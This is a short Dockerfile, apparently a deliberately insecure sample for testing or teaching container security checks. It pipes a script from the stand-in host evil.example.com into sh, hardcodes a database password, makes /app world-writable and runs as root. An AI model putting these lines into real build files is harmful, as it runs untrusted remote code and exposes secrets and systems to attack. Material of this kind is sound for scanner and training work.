FROM ubuntu:latest
RUN curl http://evil.example.com/install.sh | sh
ENV DB_PASSWORD=hunter2
RUN chmod 777 /app
USER root